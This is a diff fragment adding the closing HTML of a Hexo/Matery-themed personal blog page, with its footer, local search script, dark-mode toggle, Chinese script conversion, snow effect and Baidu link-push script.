+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2020-2023</span>
+            
+            <a href="/about" target="_blank">Red6380</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+                <span id="translate">|&nbsp;繁/简：</span><a id="translateLink" href="javascript:translatePage();">繁</a>
+            
+            <br>
+            
+            
+            
+            
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/red6380" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        <script type="text/javascript" src="/js/tw_cn.js"></script>
+        <script type="text/javascript">
+          var defaultEncoding = 2; //网站编写字体是否繁体，1-繁体，2-简体
+          var translateDelay = 0; //延迟时间,若不在前, 要设定延迟翻译时间, 如100表示100ms,默认为0
+          var cookieDomain = "http://red6380.github.io"; //Cookie地址, 一定要设定, 通常为你的网址
+          var msgToTraditionalChinese = "繁"; //此处可以更改为你想要显示的文字
+          var msgToSimplifiedChinese = "简"; //同上，但两处均不建议更改
+          var translateButtonId = "translateLink"; //默认互换id
+          translateInitilization();
+        </script>
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
